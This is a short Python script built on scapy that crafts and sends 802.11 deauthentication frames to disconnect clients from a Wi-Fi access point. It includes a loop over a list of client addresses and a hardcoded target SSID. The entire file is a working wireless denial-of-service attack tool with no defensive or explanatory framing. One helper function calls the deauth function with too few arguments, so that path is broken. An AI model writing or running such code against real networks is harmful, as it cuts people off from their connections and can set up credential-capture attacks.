from scapy.all import sendp, Dot11Elt, Dot11, RadioTap, Dot11Deauth


def check_deauth(pkt):
    print("Recived package")
    elt = pkt[Dot11Elt]
    while elt and elt.ID != 0:
        elt = elt.payload[Dot11Elt]
    print(elt.info)
    # if elt.info == SSID:
    deauth(pkt[Dot11].addr1, pkt[Dot11].addr2)


def deauth(iface: str, bssid: str, client: str, reason: int = 7):
    packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
        Dot11Deauth(reason=reason)
    sendp(packet, iface=iface)


def deauth_clients(iface: str, clients: list[str], AP_mac: str, reasoncode: int = 6):

    for client in clients:
        deauth(iface, AP_mac, client, reason=reasoncode)


SSID = "b'Sams 9'"
